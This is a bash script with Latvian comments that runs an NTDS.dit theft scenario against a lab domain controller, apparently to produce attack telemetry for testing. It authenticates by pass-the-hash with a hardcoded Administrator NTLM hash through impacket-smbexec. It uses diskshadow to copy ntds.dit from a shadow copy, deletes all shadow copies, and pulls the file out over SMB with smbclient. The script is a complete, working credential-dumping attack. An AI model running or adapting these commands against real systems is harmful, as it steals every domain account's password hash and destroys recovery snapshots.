#!/bin/bash
: '''
Jāeksistē C:\Temp\shadow.txt ar sekojošo saturu:
set context persistent nowriters
set metadata C:\Temp\cab.cab
begin backup
add volume C: alias myDrive
create
expose %myDrive% Z:
end backup
'''

set -euo pipefail

ADMINISTRATOR_NTLM="aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b"
ADMINISTRATOR_NT="217e50203a5aba59cefa863c724bf61b"
DOMAIN="LAB"
DC_IP="10.99.10.10"
SCENARIO_ID="${1:-ntds_diskshadow_smb}"
LOG_FILE="scenario.log"

START_TIME="$(date -Is)"
echo "${START_TIME},scenario=${SCENARIO_ID},type=ntds_exfil,status=start,domain=${DOMAIN},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${START_TIME}: Sākts NTDS.dit eksfiltrēšanas scenārijs ${SCENARIO_ID}"
echo "[*] Domēns: ${DOMAIN} DC: ${DC_IP}"

echo -e 'diskshadow /s C:\Temp\shadow.txt\ncopy Z:\Windows\NTDS\\ntds.dit C:\Temp\\ntds.dit\n"delete shadows all" | diskshadow\nexit' | impacket-smbexec -shell-type powershell -hashes ${ADMINISTRATOR_NTLM} ${DOMAIN}/Administrator@${DC_IP}
echo -e "cd temp\nget ntds.dit\nrm ntds.dit\nexit" | smbclient //10.99.10.10/C$ -U "LAB/Administrator%${ADMINISTRATOR_NT}" --pw-nt-hash

END_TIME="$(date -Is)"
echo "${END_TIME},scenario=${SCENARIO_ID},type=ntds_exfil,status=end,domain=${DOMAIN},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${END_TIME}: Pabeigts scenārijs ${SCENARIO_ID}"

